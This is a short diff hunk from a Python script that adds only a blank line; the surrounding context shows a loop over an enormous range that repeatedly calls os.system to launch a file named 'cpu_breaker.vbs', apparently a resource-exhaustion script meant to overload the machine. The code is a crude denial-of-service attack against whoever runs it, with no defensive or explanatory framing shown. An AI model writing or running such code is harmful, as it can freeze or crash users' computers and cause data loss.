@@ -151,3 +151,4 @@ for i in range(999999999 * 9999999999):
     os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
     os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
     os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    
